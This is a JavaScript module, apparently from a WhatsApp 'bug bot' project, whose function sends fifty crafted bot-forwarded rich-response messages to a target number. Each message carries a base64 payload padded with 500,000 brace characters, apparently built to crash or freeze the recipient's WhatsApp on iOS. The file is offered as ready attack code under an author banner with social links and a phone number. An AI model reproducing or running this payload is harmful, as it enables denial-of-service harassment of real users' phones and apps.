/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@poucode/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function ios(sock, target) {
    console.log(chalk.blue(`🍎 Memulai IOS ke ${target}`));

    let successCount = 0;
    let failCount = 0;

for (let i = 0; i < 50; i++) {
        try {
            const content = {
                botForwardedMessage: {
                    message: {
                        richResponseMessage: {
                            messageType: 1,
                            submessages: [
                                {
                                    messageType: 2,
                                    messageText: "🍃Godline - behind"
                                }
                            ],
                            unifiedResponse: {
                                data: Buffer.from(JSON.stringify({
                                    response_id: crypto.randomUUID(),
                                    sections: [
                                        {
                                            view_model: {
                                                primitive: {
                                                    text: "🍃Godline - behind",
                                                    inline_entities: ["{".repeat(500000)],
                                                    __typename: "GenAIMarkdownTextUXPrimitive"
                                                },
                                                __typename: "GenAISingleLayoutViewModel"
                                            }
                                        }
                                    ]
                                })).toString('base64')
                            },
                            contextInfo: {
                                forwardingScore: 1,
                                isForwarded: true,
                                forwardOrigin: 4,
                                forwardedAiBotMessageInfo: {
                                    botJid: "0@bot"
                                }
                            }
                        }
                    }
                }
            };

            const msg = await generateWAMessageFromContent(target, content, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                noSelfSync: true
            });

            successCount++;
            console.log(chalk.green(`✅ IOS [${i + 1}/50] berhasil dikirim ke ${target}`));

        } catch (err) {
            failCount++;
            console.log(chalk.red(`❌ IOS [${i + 1}/50] gagal: ${err.message}`));
        }

        await sleep(5000);
    }

    console.log(chalk.yellow(`📊 IOS selesai! ✅ ${successCount} berhasil | ❌ ${failCount} gagal → ${target}`));
}
    

module.exports = { ios };